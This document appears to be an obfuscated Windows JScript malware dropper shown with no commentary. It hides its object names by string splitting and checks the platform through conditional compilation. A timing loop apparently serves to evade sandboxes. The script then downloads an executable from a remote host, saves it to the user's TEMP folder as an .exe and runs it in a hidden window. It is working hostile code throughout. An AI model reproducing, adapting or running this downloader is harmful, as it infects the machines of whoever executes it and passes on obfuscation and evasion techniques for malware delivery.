var MR = false;
var EQ = "Create"+"Object";
var B = function CU() {return WScript[EQ]("WScript"+".Shell");}(), LI = 11;
var G1 = "MSXML2"+".XMLHTTP";
var N = 2;
var A = N - 2;
function Q(XI){B["Run"](XI, A, A);};
function OY(){return G1 + "";};
function JJ(SG, N1){A = A * 1; return SG - N1;};
function G(){return EQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    MR = true;
  @end
@*/
if (MR)
{
var L = "";
function YB(){return 22;};
var PR = 0; var WY = 0;
function F()
{
var XY = new this["Date"]();
var G0 = XY["getUTCMilliseconds"]();
WScript["Sleep"](YB());
var XY = new this["Date"]();
var S = XY["getUTCMilliseconds"]();
WScript["Sleep"](YB());
var XY = new this["Date"]();
var X = XY["getUTCMilliseconds"]();
var PR = "J";
PR = JJ(S, G0);
var WY = "A0";
WY = JJ(X, S);
L = "open";
return JJ(PR, WY);
}
var YI = false;
var H = false;
for (var Q0 = A; Q0 < YB() * 1; Q0++){if (F() != A){
YI = true; 
WY = "31" + 11 * PR + WY; 
H = true; 
break;
}}
function QY() {return ((YI == true) && (YI == H)) ? 1 : A;};
if (YI && QY() && H){
function VI() {return B["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MNGPTzLt071I.ex" + "e";};
 DS = OY();
 ZG = WScript[EQ](DS);
 var YG = 1;
do { 
	for (;YG;){
	try {
		if (YG == 1)
		{
			ZG[L]("GET", "http://brand-obuv.ru/m3isud", false);
			ZG["send"]();
			A1 = "Sleep";
			YG = 2;
		}
		WScript[A1](YB() + 120); 
		if (ZG["readystate"] < 2 * 2) continue;
		YG = A;
		function LY(U) {var XR = (1, 2, 3, 4, 5, U); return XR;};
		O = WScript[G()]("ADODB.Stream");
		DS = O;
		DS[L]();
		DS["type"] = LY(1);
		DS["write"](ZG["ResponseBody"]);
		O["position"] = LY(A);
		DS["Save" + "ToFile"](VI(), 2);
		O["cl"+"ose"]();
		IT = VI();
		Q(IT);
	} catch(N0){};};
}while (YG);
}
}

